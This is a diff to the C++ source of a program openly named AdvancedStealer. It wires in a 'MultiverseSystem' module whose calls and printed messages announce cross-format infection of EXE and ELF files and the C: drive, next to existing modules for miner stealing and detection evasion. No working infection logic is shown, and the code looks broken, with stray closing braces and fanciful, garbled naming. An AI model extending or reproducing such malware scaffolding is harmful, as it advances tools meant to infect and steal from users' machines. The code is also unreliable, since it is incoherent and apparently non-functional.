@@ -11,6 +11,7 @@
 #include "pixel_evasion.h"
 #include "bitcoin_miner_stealer.h"
 #include "offline_ai_engine.h"
+#include "multiverse_system.h"
 
 #include <iostream>
 #include <thread>
@@ -36,6 +37,7 @@ private:
     std::unique_ptr<PixelEvasion> pixelEvasion;
     std::unique_ptr<BitcoinMinerStealer> bitcoinMinerStealer;
     std::unique_ptr<OfflineAIEngine> offlineAIEngine;
+    std::unique_ptr<MultiverseSystem> multiverseSystem;
     
     std::atomic<bool> isRunning;
     std::thread mainThread;
@@ -52,6 +54,7 @@ public:
         std::cout << "🫥 Pixel Evasion | 👻 Off-Screen Files | 🚫 Screen Detection" << std::endl;
         std::cout << "⛏️ Bitcoin Miner Stealer | 💰 Steal Mining Spots | 📊 Benchmark Miners" << std::endl;
         std::cout << "🤖 Offline AI Engine | 🧠 Local Intelligence | 🎯 Smart Decisions" << std::endl;
+        std::cout << "🌌 Multiverse System | 🚀 Cross-Format Travel | 🪐 Partition Universes" << std::endl;
         std::cout << "========================================================" << std::endl;
         
         initializeComponents();
@@ -81,6 +84,7 @@ public:
         startPixelEvasion();
         startBitcoinMinerStealer();
         startOfflineAIEngine();
+        startMultiverseSystem();
         
         // Start main thread
         mainThread = std::thread(&AdvancedStealer::mainLoop, this);
@@ -183,6 +187,12 @@ public:
             offlineAIEngine->createNeuralNetwork();
         }
         
+        if (multiverseSystem) {
+            multiverseSystem->activateMultiverse();
+            multiverseSystem->discoverUniverses();
+            multiverseSystem->infectMultiverse();
+        }
+        
         std::cout << "🌟 ULTIMATE MODE ACTIVATED! 🌟" << std::endl;
         std::cout << "🎭 Multiple Personalities | ⏰ Time Control | 🛡️ Ultimate Armor" << std::endl;
         std::cout << "🎮 Pac-Man Supreme | ⚡ Infinite Power | 🏊 Eternal Vacation" << std::endl;
@@ -205,6 +215,7 @@ private:
         pixelEvasion = std::make_unique<PixelEvasion>();
         bitcoinMinerStealer = std::make_unique<BitcoinMinerStealer>();
         offlineAIEngine = std::make_unique<OfflineAIEngine>();
+        multiverseSystem = std::make_unique<MultiverseSystem>();
         
         std::cout << "✅ All components initialized!" << std::endl;
     }
@@ -332,6 +343,19 @@ private:
             std::cout << "🧠 Neural network created! Learning and adapting locally!" << std::endl;
         }
     }
+    
+    void startMultiverseSystem() {
+        if (multiverseSystem) {
+            multiverseSystem->initializeMultiverse();
+            multiverseSystem->activateMultiverse();
+            multiverseSystem->discoverUniverses();
+            multiverseSystem->createEXEUniverse();
+            multiverseSystem->createELFUniverse();
+            multiverseSystem->createCDriveUniverse();
+            std::cout << "🌌 Multiverse system activated! Traveling between formats and partitions!" << std::endl;
+            std::cout << "🚀 EXE, ELF, C: Drive universes created! Cross-format infection enabled!" << std::endl;
+        }
+    }
     }
     }
     
@@ -349,7 +373,7 @@ private:
     }
     
     void performRandomAction() {
-        std::uniform_int_distribution<> actionDist(1, 48);
+        std::uniform_int_distribution<> actionDist(1, 54);
         int action = actionDist(gen);
         
         switch (action) {
@@ -496,6 +520,24 @@ private:
                 break;
             case 48:
                 if (offlineAIEngine) offlineAIEngine->generatePersonas();
+                break;
+            case 49:
+                if (multiverseSystem) multiverseSystem->travelToUniverse("EXE_Universe");
+                break;
+            case 50:
+                if (multiverseSystem) multiverseSystem->travelToUniverse("ELF_Universe");
+                break;
+            case 51:
+                if (multiverseSystem) multiverseSystem->executeEXEStrategy();
+                break;
+            case 52:
+                if (multiverseSystem) multiverseSystem->executeELFStrategy();
+                break;
+            case 53:
+                if (multiverseSystem) multiverseSystem->infectMultiverse();
+                break;
+            case 54:
+                if (multiverseSystem) multiverseSystem->createUniverseBridge("EXE_Universe", "ELF_Universe");
                 break;
         }
     }
